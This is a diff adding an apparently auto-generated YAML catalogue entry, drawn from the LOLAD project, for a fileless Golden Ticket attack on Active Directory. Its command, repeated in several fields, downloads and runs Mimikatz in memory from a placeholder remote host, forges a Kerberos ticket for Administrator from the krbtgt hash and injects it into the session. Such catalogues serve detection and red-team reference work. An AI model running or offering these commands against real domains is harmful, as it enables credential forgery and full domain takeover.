@@ -1,0 +1,93 @@
+id: lolad/R29sZGVuIFRpY2tldCBBdHRhY2sgKEZpbGVsZXNzKQ/SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vc2Vydmlkb3JfcmVtb3RvL21pbWlrYXR6LnBzMScpOyBJbnZva2UtTWltaWthdHogLUNvbW1hbmQgJ2tlcmJlcm9zOjpnb2xkZW4gL3VzZXI6QWRtaW5pc3RyYXRvciAvZG9tYWluOmRvbWFpbi5sb2NhbCAvc2lkOlMtMS01LTIxLSAva3JidGd0OiAvaWQ6NTAwJyBMb2FkIHRoZSB0aWNrZXQgaW4gc2Vzc2lvbjogSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vc2Vydmlkb3JfcmVtb3RvL21pbWlrYXR6LnBzMScpOyBJbnZva2UtTWltaWthdHogLUNvbW1hbmQgJ2tlcmJlcm9zOjpwdHQgJw/UG93ZXJTaGVsbCAoRmlsZWxlc3Mp
+type: technique
+platform: active-directory
+name: Golden Ticket Attack (Fileless)
+phases:
+- persistence
+capabilities:
+- persistence
+privilege_required: specific-right
+sources:
+- project: LOLAD
+  upstream_url: https://lolad-project.github.io
+  license: verify upstream LICENSE
+  upstream_version: 6ed6a258f6e5a4692cec07f9692ed097551e04e5
+  last_synced: '2026-11-13'
+commands:
+- template: 'IEX (New-Object Net.WebClient).DownloadString(''http://servidor_remoto/mimikatz.ps1''); Invoke-Mimikatz
+    -Command ''kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21- /krbtgt: /id:500''
+    Load the ticket in session: IEX (New-Object Net.WebClient).DownloadString(''http://servidor_remoto/mimikatz.ps1'');
+    Invoke-Mimikatz -Command ''kerberos::ptt '''
+references:
+- https://lolad-project.github.io
+tags:
+- active-directory
+- lolad
+- powershell (fileless)
+source_data:
+  LOLAD:
+    raw:
+      name: Golden Ticket Attack (Fileless)
+      command: 'IEX (New-Object Net.WebClient).DownloadString(''http://servidor_remoto/mimikatz.ps1'');
+        Invoke-Mimikatz -Command ''kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-
+        /krbtgt: /id:500'' Load the ticket in session: IEX (New-Object Net.WebClient).DownloadString(''http://servidor_remoto/mimikatz.ps1'');
+        Invoke-Mimikatz -Command ''kerberos::ptt '''
+      type: PowerShell (Fileless)
+      reference: HackTricks - Golden Ticket
+      physical_rows:
+      - input_ref: index.html#row=124
+        row_utf8: "<tr>\r\n\t\t    <td>Golden Ticket Attack (Fileless)</td>\r\n\t\t    <td>\r\n\t\t  \
+          \      <code>IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1');\
+          \ Invoke-Mimikatz -Command 'kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-<Domain-SID>\
+          \ /krbtgt:<krbtgt_hash> /id:500'</code>\r\n\t\t        <br>Load the ticket in session:\r\n\t\
+          \t        <br><code>IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1');\
+          \ Invoke-Mimikatz -Command 'kerberos::ptt <ticket.kirbi>'</code>\r\n\t\t    </td>\r\n\t\t  \
+          \  <td>PowerShell (Fileless)</td>\r\n\t\t    <td><a href=\"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-attacks/golden-ticket\"\
+          \ target=\"_blank\">HackTricks - Golden Ticket</a></td>\r\n\t\t</tr>"
+        row_sha256: sha256:5c1031cad1619eae02b19d282bd8d986ec7b1b31d676c60a01ccb68d9837571a
+        cells:
+        - Golden Ticket Attack (Fileless)
+        - 'IEX (New-Object Net.WebClient).DownloadString(''http://servidor_remoto/mimikatz.ps1''); Invoke-Mimikatz
+          -Command ''kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21- /krbtgt:
+          /id:500'' Load the ticket in session: IEX (New-Object Net.WebClient).DownloadString(''http://servidor_remoto/mimikatz.ps1'');
+          Invoke-Mimikatz -Command ''kerberos::ptt '''
+        - PowerShell (Fileless)
+        - HackTricks - Golden Ticket
+      physical_occurrence_count: 1
+    upstream_url: https://lolad-project.github.io
+    upstream_version: 6ed6a258f6e5a4692cec07f9692ed097551e04e5
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: persistence
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a258f6e5a4692cec07f9692ed097551e04e5
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+  phases:
+  - value: persistence
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a258f6e5a4692cec07f9692ed097551e04e5
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+  privilege_required:
+    value: specific-right
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a258f6e5a4692cec07f9692ed097551e04e5
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLAD: sha256:7bd408e00653fa3783a1b452483671cbc2de63203dc70161b7deaa02c1840967
